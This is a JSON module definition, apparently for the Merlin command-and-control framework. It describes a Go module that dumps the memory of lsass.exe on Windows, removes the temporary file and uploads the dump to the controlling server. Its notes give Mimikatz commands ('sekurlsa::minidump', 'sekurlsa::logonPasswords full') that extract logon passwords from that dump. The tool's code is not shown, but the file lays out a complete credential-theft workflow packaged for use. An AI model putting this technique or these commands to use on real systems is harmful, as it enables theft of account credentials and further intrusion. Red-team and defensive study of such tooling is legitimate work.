{
    "base": {
      "name": "Minidump",
      "type": "extended",
      "author": ["Cameron Stokes (@C__Sto)"],
      "credits": [""],
      "path": ["windows", "x64", "go", "credentials", "minidump.json"],
      "platform": "WINDOWS",
      "arch": "x64",
      "lang": "Go",
      "privilege": true,
      "remote": "",
      "local": [""],
      "options": [
        {"name": "process", "value": "lsass.exe", "required": true, "flag": "", "description":"Name of the process to obtain a minidump of. If multiple processes exist with this name, it's likely the lowest PID will be used."},
        {"name": "pid", "value": "0", "required": false, "flag": "", "description":"Specific PID to dump. Will ignore process name if this value is set to anything except 0."},
        {"name": "tempLocation", "value": "", "required": false, "flag":"", "description": "A directory where the minidump temporary file will be written. The file is removed immediately after process dumping is complete. If a path is not provided, the first non-empty value from %TMP%, %TEMP%, %USERPROFILE%, or the Windows directory is used."}
      ],
      "description": "Calls Windows MiniDumpWriteDump API on the provided process, dumps out to a temporary file and uploads the minidump file to the Merlin server.",
      "notes": "Written in native go - the only disk access is when writing out the file to the temp location. Must be elevated to run, and automatically sets the correct token privileges required to access other processes memory..\r\n\r\nUse \"sekurlsa::minidump dumpfile.dmp\" \"sekurlsa::logonPasswords full\" on the same OS/arch to parse the dump file"
    }
}